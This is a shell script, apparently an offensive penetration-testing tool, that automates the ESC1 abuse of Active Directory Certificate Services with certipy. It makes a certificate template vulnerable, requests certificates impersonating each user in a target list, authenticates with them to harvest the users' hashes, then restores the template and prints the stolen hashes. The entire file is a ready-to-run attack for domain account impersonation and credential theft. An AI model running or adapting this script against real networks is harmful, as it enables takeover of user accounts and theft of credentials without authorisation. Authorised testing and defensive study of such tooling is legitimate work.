#!/bin/sh
# A POSIX variable
OPTIND=1         # Reset in case getopts has been used previously in the shell.
# Initialize our own variables:
output_file=""
while getopts "h:?:v:u:p:d:T:t:i:U::c:H:s" opt; do
  case "$opt" in
    h|\?)
      echo "./ADCSink.sh -u username -d domain -T template_name -t targeted_ca -c ca_name -i dc-ip -U targeted_users [-p password] [-H hash] [-s] [-v]"
      echo "-v: verbose mode"
      echo "-s: do not modify certificate template, assume that ESC1 is already present"
      exit 0
      ;;
    u)  username=$OPTARG
      ;;
    d)  domain=$OPTARG
      ;;
    p)  password=$OPTARG
      ;;
    H)  hash=$OPTARG
      ;;
    T)  template=$OPTARG
      ;;
    t)  targeted_ca=$OPTARG
      ;;
    i)  dc_ip=$OPTARG
      ;;
    U)  targeted_users=$OPTARG
      ;;
    c)  ca_name=$OPTARG
      ;;
    s)  DoNotChangeTemplateConfiguration=1
      ;;
    v)  verbose=1
      ;;
  esac
done

shift $((OPTIND-1))

if ! command -v certipy 
then
    echo "certipy could not be found, install it with the following command:"
    echo "pip3 install certipy-ad"
    exit 1
fi

[ "${1:-}" = "--" ] && shift

if [ ! -z "$hash" ]; then
	cmd="-hashes "$hash
fi
if [ ! -z "$password" ]; then
	cmd="-p "$password
fi

execution_date=`date +%s`; output_dir='output_'$template'_'$execution_date
mkdir $output_dir
touch $output_dir/logs.txt

if [ ! $DoNotChangeTemplateConfiguration ]; then
  echo "> \e[0;31m Modifying the certificate template \e[0m" $template | tee -a $output_dir/logs.txt
  certipy template -u $username'@'$domain -template $template -save-old $cmd 2>/dev/null >> $output_dir/logs.txt
  mv $template'.json' $output_dir
  echo "The old certificate template is saved here: " $output_dir/$template'.json' | tee -a $output_dir/logs.txt
fi
echo "> \e[0;31m Reading targeted users from the file: \e[0m" $targeted_users | tee -a $output_dir/logs.txt
for requested_user in `cat $targeted_users | cut -d '' -f 1`; do 
	echo "Request & auth for the user: " $requested_user
	echo "  > \e[0;31m Requesting a certificate for: \e[0m" $requested_user | tee -a $output_dir/logs.txt
	certipy req -u $username'@'$domain $cmd  -target $targeted_ca -template $template -ca $ca_name -upn $requested_user'@'$domain -out $output_dir/$requested_user 2>/dev/null >> $output_dir/logs.txt
	echo "  > \e[0;31m Authenticating with a certificate for: \e[0m" $requested_user | tee -a $output_dir/logs.txt
        certipy auth -pfx $output_dir/$requested_user'.pfx' -dc-ip $dc_ip 2>/dev/null >> $output_dir/logs.txt
done
if [ ! $DoNotChangeTemplateConfiguration ]; then
  echo "> \e[0;31m Restoring the template certificate: \e[0m"$template | tee -a $output_dir/logs.txt
  certipy template -u $username'@'$domain $cmd -template $template -configuration $output_dir/$template'.json' 2>/dev/null >> $output_dir/logs.txt
fi
echo "Find the certipy output here: " $output_dir/logs.txt  
echo ""
echo "This is your hashes: "
grep "Got hash for" $output_dir/logs.txt 

